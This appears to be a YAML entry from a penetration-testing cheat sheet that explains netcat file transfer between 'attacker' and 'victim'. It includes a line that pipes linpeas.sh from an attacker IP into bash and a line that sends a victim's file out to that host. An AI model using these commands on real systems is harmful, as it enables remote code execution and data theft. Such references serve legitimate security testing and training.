---
description: |
  The Netcat (nc) command is a command-line utility for reading and writing data between two computer networks. Which can be used to transfer files between victim and attacker.

  Command Reference:

  	File to copy: linpeas.sh

command: |
  nc -lvnp 9001 < linpeas.sh

code: |
  Copy from attacker to victim:  
  nc -lvnp 9001 < linpeas.sh (attacker) 
    
  nc 10.10.21.14 9001 | bash (victim)

  Copy from victim to attacker: 
  nc 10.10.21.14 9001 < file.txt (victim)
    
  nc -lvnp 9001 > file.txt (attacker)

items:
  - Shell
services:

OS:
  - Windows
  - Linux
attack_types:
  - General
references:
  - https://medium.com/iostrap/how-to-transfer-files-between-servers-using-netcat-d8bc13eebea
  - https://linux.die.net/man/1/nc
---
